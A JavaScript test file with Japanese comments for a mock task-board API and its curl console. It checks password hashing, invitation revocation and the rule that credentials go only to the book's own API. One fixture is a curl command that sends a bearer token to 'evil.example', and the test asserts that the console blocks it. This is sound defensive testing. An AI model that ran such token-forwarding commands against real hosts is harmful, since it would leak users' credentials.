// 模擬APIとコンソールの安全策のテスト（node site/tests/mock.test.mjs で実行する）
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { createMockApi, sha256 } from '../assets/js/taskboard-mock.js';
import { parseCurl } from '../assets/js/curl.js';

// console.js はブラウザー用のモジュールなので、使う関数だけを読み込めるよう最小限の環境を用意する
globalThis.localStorage = { getItem: () => null, setItem: () => {}, removeItem: () => {} };
globalThis.window = { dispatchEvent: () => {}, addEventListener: () => {} };
globalThis.CustomEvent = class { constructor(type) { this.type = type; } };
globalThis.document = { documentElement: { dataset: {} } };
const { resolveTarget, carryCreatedId, isCreateTask } = await import('../assets/js/console.js');

const results = [];
async function test(name, fn) {
  try { await fn(); results.push(['ok', name]); } catch (error) { results.push(['NG', name, error.message]); }
}

function memoryStorage() {
  const data = new Map();
  return { getItem: (k) => data.get(k) ?? null, setItem: (k, v) => data.set(k, v), removeItem: (k) => data.delete(k), data };
}

function client(api) {
  return async (method, url, { token, body, headers = {} } = {}) => {
    const h = { 'Content-Type': 'application/json', ...headers };
    if (token) h.Authorization = `Bearer ${token}`;
    const r = await api.request({ method, url: `http://localhost${url}`, headers: h, body: body === undefined ? '' : JSON.stringify(body) });
    return { ...r, json: r.body ? JSON.parse(r.body) : null };
  };
}

async function login(call, email, password = 'password') {
  return (await call('POST', '/api/v1/login', { body: { email, password, device_name: 'test' } })).json.data.token;
}

await test('SHA-256 が Node の実装と一致する', () => {
  for (const t of ['', 'abc', 'パスワード', 'x'.repeat(1000)]) {
    assert.equal(sha256(t), createHash('sha256').update(t).digest('hex'));
  }
});

await test('登録したパスワードを平文で保存しない', async () => {
  const storage = memoryStorage();
  storage.setItem('taskboard-mock-v1', '{"old":"password=secret"}');
  const call = client(createMockApi({ storage }));
  const r = await call('POST', '/api/v1/register', { body: { name: '花子', email: 'hanako@example.com', password: 'my-real-pass-123', password_confirmation: 'my-real-pass-123' } });
  assert.equal(r.status, 201);
  const saved = [...storage.data.values()].join('\n');
  assert.ok(!saved.includes('my-real-pass-123'), '平文のパスワードが保存されている');
  assert.equal(storage.getItem('taskboard-mock-v1'), null, '以前の版の保存データが残っている');
  assert.ok(await login(call, 'hanako@example.com', 'my-real-pass-123'));
  const wrong = await call('POST', '/api/v1/login', { body: { email: 'hanako@example.com', password: 'nope', device_name: 'x' } });
  assert.equal(wrong.status, 422);
});

await test('巨大なページ番号でもすぐに応答する', async () => {
  const call = client(createMockApi());
  const token = await login(call, 'test@example.com');
  const started = Date.now();
  const r = await call('GET', '/api/v1/tasks?per_page=1&page=9007199254740996', { token });
  assert.equal(r.status, 200);
  assert.equal(r.json.data.length, 0);
  assert.ok(Date.now() - started < 500);
  assert.ok(r.json.meta.links.length <= 13);
});

await test('送り直した招待で、前の招待は使えなくなる', async () => {
  const mails = [];
  const call = client(createMockApi({ onMail: (m) => mails.push(m) }));
  const owner = await login(call, 'test@example.com');
  await call('POST', '/api/v1/register', { body: { name: '花子', email: 'hanako@example.com', password: 'secret-pass', password_confirmation: 'secret-pass' } });
  const hanako = await login(call, 'hanako@example.com', 'secret-pass');
  await call('POST', '/api/v1/teams/1/invitations', { token: owner, body: { email: 'hanako@example.com', role: 'admin' } });
  await call('POST', '/api/v1/teams/1/invitations', { token: owner, body: { email: 'hanako@example.com', role: 'admin' } });
  const [first, second] = mails.map((m) => m.code);
  assert.equal((await call('POST', `/api/v1/invitations/${first}/accept`, { token: hanako })).status, 404);
  assert.equal((await call('POST', `/api/v1/invitations/${second}/accept`, { token: hanako })).status, 200);
});

await test('外したメンバーは、古い招待で戻れない', async () => {
  const mails = [];
  const api = createMockApi({ onMail: (m) => mails.push(m) });
  const call = client(api);
  const owner = await login(call, 'test@example.com');
  await call('POST', '/api/v1/register', { body: { name: '花子', email: 'hanako@example.com', password: 'secret-pass', password_confirmation: 'secret-pass' } });
  const hanako = await login(call, 'hanako@example.com', 'secret-pass');
  // 以前の版で作られた、同じ人あての有効な招待が2件ある状態を再現する
  await call('POST', '/api/v1/teams/1/invitations', { token: owner, body: { email: 'hanako@example.com', role: 'admin' } });
  const legacy = { ...api.state.invitations[0], id: 99, token_hash: sha256('legacy-code') };
  api.state.invitations.push(legacy);
  assert.equal((await call('POST', `/api/v1/invitations/${mails[0].code}/accept`, { token: hanako })).status, 200);
  const hanakoId = api.state.users.find((u) => u.email === 'hanako@example.com').id;
  assert.equal((await call('DELETE', `/api/v1/teams/1/members/${hanakoId}`, { token: owner })).status, 204);
  assert.equal((await call('POST', '/api/v1/invitations/legacy-code/accept', { token: hanako })).status, 404);
  assert.equal((await call('GET', '/api/v1/teams/1', { token: hanako })).status, 404);
  assert.ok(!api.state.team_user.some((m) => m.user_id === hanakoId));
});

await test('作成で返ったIDだけを、続くコマンドに入れる', () => {
  const texts = [
    'curl -X PATCH http://localhost/api/v1/tasks/41 \\\n    -H "Authorization: Bearer $TOKEN" -d \'{"is_done":true}\'',
    'curl -i -X DELETE http://localhost/api/v1/tasks/41 \\\n    -H "Authorization: Bearer $TOKEN"',
    'curl http://localhost/api/v1/tags -H "Authorization: Bearer $TOKEN"',
  ];
  const { texts: out, changed } = carryCreatedId(texts, 56);
  assert.equal(changed, 2);
  assert.ok(out[0].includes('/tasks/56') && !out[0].includes('/tasks/41'));
  assert.ok(out[1].includes('/tasks/56'));
  assert.equal(out[2], texts[2]);
  assert.ok(isCreateTask({ method: 'POST', url: 'http://localhost/api/v1/tasks' }));
  assert.ok(isCreateTask({ method: 'POST', url: 'http://localhost/api/v1/teams/1/tasks' }));
  assert.ok(!isCreateTask({ method: 'PATCH', url: 'http://localhost/api/v1/tasks/1' }));
});

await test('認証情報は、本書のAPIにだけ送る', () => {
  const vars = { TOKEN: '1|real-token' };
  const toEvil = parseCurl('curl https://evil.example/api -H "Authorization: Bearer $TOKEN"', vars);
  assert.throws(() => resolveTarget('local', toEvil, 'http://localhost'), /本書のAPIにだけ/);
  assert.throws(() => resolveTarget('browser', toEvil, 'http://localhost'), /本書のAPIにだけ/);
  const otherPath = parseCurl('curl http://localhost/telescope -H "Authorization: Bearer $TOKEN"', vars);
  assert.throws(() => resolveTarget('local', otherPath, 'http://localhost'), /\/api\//);
  const ok = parseCurl('curl http://localhost/api/v1/me -H "Authorization: Bearer $TOKEN"', vars);
  assert.equal(resolveTarget('local', ok, 'http://localhost:8080').url, 'http://localhost:8080/api/v1/me');
  assert.equal(resolveTarget('browser', ok, 'http://localhost').via, 'mock');
  const github = parseCurl('curl -i https://api.github.com/users/laravel', {});
  assert.equal(resolveTarget('local', github).via, 'internet');
  const githubPost = parseCurl('curl -X POST https://api.github.com/x -d "a=1"', {});
  assert.throws(() => resolveTarget('local', githubPost), /GET/);
  const unknown = parseCurl('curl https://example.com/', {});
  assert.throws(() => resolveTarget('browser', unknown), /本書のAPIと/);
});

for (const [status, name, message] of results) console.log(`${status} ${name}${message ? `: ${message}` : ''}`);
if (results.some(([status]) => status !== 'ok')) process.exit(1);
